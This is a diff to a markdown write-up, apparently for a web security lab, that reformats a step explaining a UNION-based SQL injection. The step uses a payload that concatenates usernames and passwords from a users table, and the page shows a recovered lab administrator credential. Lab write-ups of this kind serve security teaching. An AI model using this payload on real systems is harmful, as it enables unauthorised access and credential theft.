@@ -81,7 +81,7 @@ Content in the first column | Content in the second column
    Now to retrieve data from only one column we can use the following payload
    `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
    
-    >||'~'|| will join `username and password` like  administrator~wet39rb7kc6kt99lq0o6
+  `||'~'||` will join `username and password` like  `administrator~wet39rb7kc6kt99lq0o6`
    
  Now to solve the challenge go to Response in Burp Suite and get the username~password `administrator~wet39rb7kc6kt99lq0o6`
  
